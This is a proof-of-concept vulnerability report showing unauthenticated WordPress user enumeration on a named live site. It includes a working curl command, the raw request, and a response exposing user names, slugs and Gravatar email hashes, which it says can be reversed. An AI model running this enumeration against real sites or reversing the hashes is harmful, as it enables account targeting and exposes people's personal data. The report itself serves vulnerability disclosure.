# Proof of Concept — VULN-C01

**Target:** cynicaltechnology.com
**Type:** WordPress REST API User Enumeration
**Endpoint:** https://cynicaltechnology.com/wp-json/wp/v2/users
**Tested on:** March 2026
**Researcher:** Vibhor Prasad (stack-guardian)

---

## Environment

- Tool: curl, browser
- OS: Arch Linux
- Authenticated: No
- Account type: Unauthenticated

---

## Preconditions

None.

---

## Steps to Reproduce

1. Run: `curl -s "https://cynicaltechnology.com/wp-json/wp/v2/users" | python3 -m json.tool`
2. Observe the JSON response containing all registered user accounts.

---

## Payload

```bash
curl -s "https://cynicaltechnology.com/wp-json/wp/v2/users" | python3 -m json.tool
```

---

## HTTP Request

```
GET /wp-json/wp/v2/users HTTP/1.1
Host: cynicaltechnology.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
```

---

## HTTP Response

```json
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json

[
  {"id": 2, "name": "Admin", "slug": "cynical-technology", "avatar_urls": {"24": "https://secure.gravatar.com/avatar/6a18c6278b5cd54bb80c7857cef4aa3f?s=24&d=mm&r=g"}},
  {"id": 8, "name": "Bikash Sharma", "slug": "bikash", "avatar_urls": {"24": "https://secure.gravatar.com/avatar/7be92a088bf439ba728ddf12eda7a2b2?s=24&d=mm&r=g"}},
  {"id": 4, "name": "Cynical_Technology", "slug": "cynical_technology"},
  {"id": 1, "name": "root", "slug": "root"}
]
```

---

## Expected Behavior

The endpoint should require authentication or be disabled entirely. Unauthenticated requests should return 401 or 403.

---

## Actual Behavior

The endpoint returns all registered user accounts including IDs, full names, username slugs, and Gravatar email hashes without any authentication.

---

## Evidence

JSON response confirms 4 user accounts exposed. Gravatar URLs contain MD5 hashes of registered email addresses, which can be reverse-engineered using rainbow tables or online lookup services.
